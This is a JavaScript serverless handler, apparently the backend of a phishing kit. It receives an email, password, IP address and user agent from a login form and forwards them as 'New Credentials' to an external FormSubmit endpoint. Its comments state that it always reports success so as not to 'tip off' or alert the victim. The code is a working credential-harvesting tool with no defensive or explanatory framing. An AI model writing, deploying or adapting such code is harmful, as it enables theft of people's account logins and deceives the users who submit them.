// functions/api/collect.js

export async function onRequestPost(context) {
  try {
    const { request, env } = context;
    
    // 1. Parse the incoming JSON body from your frontend
    const body = await request.json();
    const { email, password, ip, userAgent } = body;

    // 2. Get your FormSubmit endpoint from an environment variable
    const formSubmitUrl = env.FORM_SUBMIT_URL;
    if (!formSubmitUrl) {
      console.error('Missing FORM_SUBMIT_URL environment variable');
      // Still return success to not tip off the user
      return new Response(JSON.stringify({ success: true }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    // 3. Build the message
    const message = `
🔐 New Credentials
📧 Email: ${email || 'N/A'}
🔑 Password: ${password || 'N/A'}
🌐 IP: ${ip || 'Unknown'}
📱 User-Agent: ${userAgent || 'N/A'}
⏰ Time: ${new Date().toISOString()}
    `;

    // 4. Send to FormSubmit
    const formSubmitResponse = await fetch(formSubmitUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email || 'No email',
        password: password || 'No password',
        ip: ip || 'Unknown',
        userAgent: userAgent || 'Unknown',
        message: message.trim()
      })
    });

    if (!formSubmitResponse.ok) {
      throw new Error(`FormSubmit responded with ${formSubmitResponse.status}`);
    }

    // 5. Always return a success response to the client
    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });

  } catch (error) {
    console.error('Error in collect handler:', error);
    // Still return success to avoid alerting the user
    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}